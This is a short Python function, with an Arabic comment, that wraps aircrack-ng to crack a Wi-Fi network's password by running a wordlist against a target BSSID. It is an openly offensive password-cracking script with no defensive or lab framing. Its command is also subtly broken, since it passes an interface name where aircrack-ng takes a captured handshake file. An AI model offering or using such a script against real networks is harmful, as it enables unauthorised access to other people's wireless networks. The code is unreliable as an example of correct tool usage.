import subprocess

def crack_wifi(network_bssid, wordlist_path, interface='wlan0'):
    # استخدام aircrack-ng لكسر كلمة مرور الشبكة
    command = f"aircrack-ng -b {network_bssid} -w {wordlist_path} {interface}"
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    output, _ = process.communicate()

    return output.decode()
